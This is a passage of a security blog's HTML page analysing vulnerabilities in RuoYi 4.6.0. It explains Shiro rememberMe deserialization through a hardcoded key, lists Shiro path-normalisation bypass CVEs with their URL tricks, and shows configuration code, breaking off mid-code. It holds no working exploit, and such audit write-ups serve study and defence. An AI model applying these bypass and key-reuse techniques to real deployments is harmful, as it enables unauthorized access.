@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Ruoyi 4.6.0漏洞 - w0s1np&#39;s blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="w0s1np" /><meta name="description" content="" /><meta name="keywords" content="w0s1np, blog, ctf, sec, pentest" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.135.0 with theme even" />
+
+
+<link rel="canonical" href="http://w0s1np.github.io/post/ruoyi-4.6.0%E6%BC%8F%E6%B4%9E/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:url" content="http://w0s1np.github.io/post/ruoyi-4.6.0%E6%BC%8F%E6%B4%9E/">
+  <meta property="og:site_name" content="w0s1np&#39;s blog">
+  <meta property="og:title" content="Ruoyi 4.6.0漏洞">
+  <meta property="og:description" content="Hack the word!">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-04-26T22:17:03+08:00">
+    <meta property="article:modified_time" content="2025-04-26T22:17:03+08:00">
+    <meta property="article:tag" content="Java">
+    <meta property="article:tag" content="若依">
+    <meta property="article:tag" content="漏洞分析">
+
+  <meta itemprop="name" content="Ruoyi 4.6.0漏洞">
+  <meta itemprop="description" content="Hack the word!">
+  <meta itemprop="datePublished" content="2025-04-26T22:17:03+08:00">
+  <meta itemprop="dateModified" content="2025-04-26T22:17:03+08:00">
+  <meta itemprop="wordCount" content="4189">
+  <meta itemprop="keywords" content="Java,若依,漏洞分析">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Ruoyi 4.6.0漏洞">
+  <meta name="twitter:description" content="Hack the word!">
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Hacker</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">首页</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">全部文章</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Hacker</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">首页</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">全部文章</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">分类</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">标签</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">关于</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Ruoyi 4.6.0漏洞</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2025-04-26 </span>
+        <div class="post-category">
+            <a href="/categories/java/"> java </a>
+            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"> 漏洞分析 </a>
+            </div>
+          <span class="more-meta"> 4189 words </span>
+          <span class="more-meta"> 9 mins read </span>
+        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> times read </span>
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境搭建">环境搭建</a>
+      <ul>
+        <li><a href="#若依项目结构">若依项目结构</a></li>
+      </ul>
+    </li>
+    <li><a href="#shiro组件">Shiro组件</a>
+      <ul>
+        <li><a href="#shiro反序列化ruoyiv-462">Shiro反序列化（RuoYi&lt;V-4.6.2）</a>
+          <ul>
+            <li><a href="#修复方式">修复方式</a></li>
+            <li><a href="#小疑问">小疑问</a></li>
+          </ul>
+        </li>
+        <li><a href="#shiro权限绕过">Shiro权限绕过</a></li>
+      </ul>
+    </li>
+    <li><a href="#thymeleaf">Thymeleaf</a></li>
+    <li><a href="#druid泄漏">druid泄漏</a></li>
+    <li><a href="#sql注入">SQL注入</a>
+      <ul>
+        <li><a href="#poc">poc</a></li>
+        <li><a href="#codeql">codeql</a></li>
+      </ul>
+    </li>
+    <li><a href="#snakeyaml">SnakeYaml</a></li>
+    <li><a href="#fastjson">Fastjson</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h1 id="ruoyi-460漏洞">ruoyi-4.6.0漏洞</h1>
+<h2 id="环境搭建">环境搭建</h2>
+<p><code>https://gitee.com/y_project/RuoYi</code>​</p>
+<p>我先选择的4.6版本</p>
+<p>mysql创建数据库:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">DATABASE</span><span class="w"> </span><span class="n">ry</span><span class="w"> </span><span class="nb">CHARACTER</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">utf8mb4</span><span class="w"> </span><span class="k">COLLATE</span><span class="w"> </span><span class="n">utf8mb4_general_ci</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">use</span><span class="w"> </span><span class="n">ry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">source</span><span class="w"> </span><span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="n">lnhsec</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">Lnh</span><span class="o">/</span><span class="n">Vuln_Analysis</span><span class="o">/</span><span class="n">RuoYi</span><span class="o">-</span><span class="n">v4</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="o">/</span><span class="k">sql</span><span class="o">/</span><span class="n">quartz</span><span class="p">.</span><span class="k">sql</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">source</span><span class="w"> </span><span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="n">lnhsec</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">Lnh</span><span class="o">/</span><span class="n">Vuln_Analysis</span><span class="o">/</span><span class="n">RuoYi</span><span class="o">-</span><span class="n">v4</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="o">/</span><span class="k">sql</span><span class="o">/</span><span class="n">ry_20201214</span><span class="p">.</span><span class="k">sql</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>/RuoYi-v4.6.0/ruoyi-admin/src/main/resources</code>​的<code>application-druid.yml</code>​、<code>application.yml</code>​修改mysql账户密码, 访问端口, 在<code>logback.xml</code>​修改日志目录</p>
+<p>然后在<code>/RuoYi-v4.6.0/ruoyi-admin/src/main/java/com/ruoyi/RuoYiApplication</code>​运行即可, 这样方便调试</p>
+<p>或者使用maven打包为jar, 然后运行<code>java -jar ruoyi-admin.jar</code>​即可</p>
+<h3 id="若依项目结构">若依项目结构</h3>
+<ul>
+<li>ruoyi-admin 启动模块,启动配置在resource的yml下</li>
+<li>ruoyi-framework 主题框架模块,框架怎么运行的仔细看看,这个是核心重点</li>
+<li>ruoyi-system 业务模块,几乎所有业务都在这里</li>
+<li>ruoyi-quartz 定时任务模块,跑的定时任务基本都在这里</li>
+<li>ruoyi-generator 基础公共表的操作,相当于基础表和基础业务存放位置</li>
+<li>ruoyi-common 公共代码模块,list转set什么的一般放这里,自己不要瞎写方法,公共的都放这里</li>
+</ul>
+<p><code>pom.xml</code>​审计</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262202852.png" alt="image"></p>
+<p>存在一些出现过问题的组件, shiro、fastjson、swagger、thymeleaf、druid等; 对于这种项目结构的项目, 最好把每个子项目的pom文件也去翻一遍(<code>ruoyi-common</code>​中也有<code>snakeyaml</code>​)</p>
+<h2 id="shiro组件">Shiro组件</h2>
+<h3 id="shiro反序列化ruoyiv-462">Shiro反序列化（RuoYi&lt;V-4.6.2）</h3>
+<p>漏洞原理: <code>Shiro</code>​将用户认证信息存储到<code>remeberme</code>​字段中, 后端读取该字段是将该字段在服务器反序列化。</p>
+<p>虽然shiro使用了AES加密remeberme字段信息, 但是由于<code>shiro-1.2.4</code>​版本在依赖jar中硬编码该密钥, 因此使用<code>shiro-1.2.4</code>​版本的系统则可以通过该密钥解密remeberme字段数据, 在remeberme字段中写入恶意的类, 即<code>shiro550</code>​漏洞的原理。</p>
+<p>1.2.5版本以后shiro提供了AES密钥的随机生成代码, 但是如果仅进行shiro的版本升级, AES密钥仍硬编码在代码中, 仍然会存在反序列化风险。</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262202388.png" alt="image"></p>
+<p>可以反序列化, 但没链子</p>
+<p>在白盒可以直接搜索<code>setCipherKey</code>​, 如果存在, 那就说明使用了默认key的, 可以全局搜索<code>cipherKey</code>​查看key值</p>
+<h4 id="修复方式">修复方式</h4>
+<p>支持动态生成密匙，防止默认密钥泄露</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * 记住我
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">CustomCookieRememberMeManager</span><span class="w"> </span><span class="nf">rememberMeManager</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CustomCookieRememberMeManager</span><span class="w"> </span><span class="n">cookieRememberMeManager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">CustomCookieRememberMeManager</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cookieRememberMeManager</span><span class="p">.</span><span class="na">setCookie</span><span class="p">(</span><span class="n">rememberMeCookie</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">StringUtils</span><span class="p">.</span><span class="na">isNotEmpty</span><span class="p">(</span><span class="n">cipherKey</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">cookieRememberMeManager</span><span class="p">.</span><span class="na">setCipherKey</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="n">cipherKey</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">else</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">cookieRememberMeManager</span><span class="p">.</span><span class="na">setCipherKey</span><span class="p">(</span><span class="n">CipherUtils</span><span class="p">.</span><span class="na">generateNewKey</span><span class="p">(</span><span class="n">128</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;AES&#34;</span><span class="p">).</span><span class="na">getEncoded</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">cookieRememberMeManager</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一，通过如下链接就可以查看这个版本修复了哪些 ISSUES, 方便定位。</p>
+<blockquote>
+<p><a href="https://issues.apache.org/jira/issues/?jql=project%20%3D%20SHIRO%20AND%20fixVersion%20%3D%201.5.2">https://issues.apache.org/jira/issues/?jql=project%20%3D%20SHIRO%20AND%20fixVersion%20%3D%201.5.2</a></p>
+</blockquote>
+<p>第二，通过 diff 版本来查看差异代码分析漏洞, 语法如下。</p>
+<blockquote>
+<p><a href="https://github.com/%E7%94%A8%E6%88%B7%E5%90%8D/%E9%A1%B9%E7%9B%AE/compare/TAG%E5%90%8D...TAG%E5%90%8D">https://github.com/用户名/项目/compare/TAG名&hellip;TAG名</a></p>
+</blockquote>
+<p>例如：<a href="https://github.com/apache/shiro/compare/shiro-root-1.7.0...shiro-root-1.7.1">https://github.com/apache/shiro/compare/shiro-root-1.7.0&hellip;shiro-root-1.7.1</a></p>
+<h4 id="小疑问">小疑问</h4>
+<p>有被动扫描可以发现登陆界面是否存在shiro组件的插件么, 因为不是每次访问都要去开burp查看流量, 可能在黑盒就会漏掉shiro反序列化漏洞</p>
+<h3 id="shiro权限绕过">Shiro权限绕过</h3>
+<p>因为查看shiro版本是存在权限绕过漏洞的</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">CVE编号</th>
+          <th style="text-align: left">漏洞说明</th>
+          <th style="text-align: left">漏洞版本</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">CVE-2016-6802</td>
+          <td style="text-align: left">Context Path 路径标准化导致绕过</td>
+          <td style="text-align: left">shrio &lt;1.3.2</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">CVE-2020-1957</td>
+          <td style="text-align: left">Spring 与 Shiro 对于 &ldquo;/&rdquo; 和 &ldquo;;&rdquo; 处理差异导致绕过</td>
+          <td style="text-align: left">Shiro &lt;= 1.5.1</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">CVE-2020-11989</td>
+          <td style="text-align: left">Shiro 二次解码导致的绕过以及 ContextPath 使用 &ldquo;;&rdquo; 的绕过</td>
+          <td style="text-align: left">shiro &lt; 1.5.3</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">CVE-2020-13933</td>
+          <td style="text-align: left">由于 Shiro 与 Spring 处理路径时 URL 解码和路径标准化顺序不一致 导致的使用 &ldquo;%3b&rdquo; 的绕过</td>
+          <td style="text-align: left">shiro &lt; 1.6.0</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">CVE-2020-17510</td>
+          <td style="text-align: left">由于 Shiro 与 Spring 处理路径时 URL 解码和路径标准化顺序不一致 导致的使用 &ldquo;%2e&rdquo; 的绕过</td>
+          <td style="text-align: left">Shiro &lt; 1.7.0</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">CVE-2020-17523</td>
+          <td style="text-align: left">Shiro 匹配鉴权路径时会对分隔的 token 进行 trim 操作 导致的使用 &ldquo;%20&rdquo; 的绕过</td>
+          <td style="text-align: left">Shiro &lt;1.7.1</td>
+      </tr>
+  </tbody>
+</table>
+<p>这时就要去看项目中对权限配置的地方, 是否有可利用的点</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">ShiroFilterFactoryBean</span><span class="w"> </span><span class="nf">shiroFilterFactoryBean</span><span class="p">(</span><span class="n">SecurityManager</span><span class="w"> </span><span class="n">securityManager</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ShiroFilterFactoryBean</span><span class="w"> </span><span class="n">shiroFilterFactoryBean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ShiroFilterFactoryBean</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Shiro的核心安全接口,这个属性是必须的</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">shiroFilterFactoryBean</span><span class="p">.</span><span class="na">setSecurityManager</span><span class="p">(</span><span class="n">securityManager</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 身份认证失败，则跳转到登录页面的配置</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">shiroFilterFactoryBean</span><span class="p">.</span><span class="na">setLoginUrl</span><span class="p">(</span><span class="n">loginUrl</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 权限认证失败，则跳转到指定页面</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">shiroFilterFactoryBean</span><span class="p">.</span><span class="na">setUnauthorizedUrl</span><span class="p">(</span><span class="n">unauthorizedUrl</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Shiro连接约束配置，即过滤链的定义</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LinkedHashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">filterChainDefinitionMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedHashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 对静态资源设置匿名访问</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/favicon.ico**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/ruoyi.png**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/css/**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/docs/**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/fonts/**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/img/**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/ajax/**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/js/**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/ruoyi/**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/captcha/captchaImage**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 退出 logout地址，shiro去清除session</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/logout&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;logout&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 不需要拦截的访问</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/login&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon,captchaValidate&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 注册相关</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/register&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon,captchaValidate&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 系统权限列表</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// filterChainDefinitionMap.putAll(SpringUtils.getBean(IMenuService.class).selectPermsAll());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Filter</span><span class="o">&gt;</span><span class="w"> </span><span class="n">filters</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedHashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Filter</span><span class="o">&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filters</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;onlineSession&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">onlineSessionFilter</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filters</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;syncOnlineSession&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">syncOnlineSessionFilter</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filters</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;captchaValidate&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">captchaValidateFilter</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filters</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;kickout&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">kickoutSessionFilter</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 注销成功，则跳转到指定页面</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filters</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;logout&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">logoutFilter</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">shiroFilterFactoryBean</span><span class="p">.</span><span class="na">setFilters</span><span class="p">(</span><span class="n">filters</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 所有请求需要认证</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">filterChainDefinitionMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;user,kickout,onlineSession,syncOnlineSession&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">shiroFilterFactoryBean</span><span class="p">.</span><span class="na">setFilterChainDefinitionMap</span><span class="p">(</span><span class="n">filterChainDefinitionMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
